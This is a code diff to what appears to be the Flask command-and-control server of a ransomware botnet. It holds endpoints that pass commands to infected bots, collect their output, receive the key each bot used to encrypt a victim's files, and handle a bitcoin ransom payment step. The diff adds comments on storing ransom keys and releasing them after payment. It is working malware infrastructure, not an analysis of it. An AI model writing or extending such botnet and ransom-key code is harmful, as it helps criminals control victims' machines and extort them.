@@ -50,18 +50,20 @@ def get_status(bot_id):
 		db.session.commit()
 	return pending_cmd
 
+#Recieve output from the bot after running command
 @api.route('/<bot_id>/report', methods=['POST'])
 def get_report(bot_id):
 	bot = Bot.query.get(bot_id)
 	if not bot:
 		abort(404)
-	out = request.form['output']
+	out = request.form['output']			
 	print(out)
 	bot.output = cgi.escape(out)
 	db.session.add(bot)
 	db.session.commit()
 	return ''
-
+#after running ransomware command
+#endpoint recieves the key to which the file directory is encrypted
 @api.route('/<bot_id>/lock', methods=['POST'])
 def get_key(bot_id):
 	bot = Bot.query.get(bot_id)
@@ -74,6 +76,8 @@ def get_key(bot_id):
 	db.session.commit()
 	return ''
 
+#if the bot has paid(need to implement a table for incoming btc transactions)
+# then return the key 
 @api.route('/<bot_id>/pay', methods=['POST'])
 def get_btc_addr(bot_id):
 	bot = Bot.query.get(bot_id)
@@ -81,7 +85,7 @@ def get_btc_addr(bot_id):
 		abort(404)
 	key = request.form['btc_addr']
 	bot.btc_addr = key
-	bot.paid = True
+	bot.paid = False
 	db.session.add(bot)
 	db.session.commit()
 	if bot.paid:
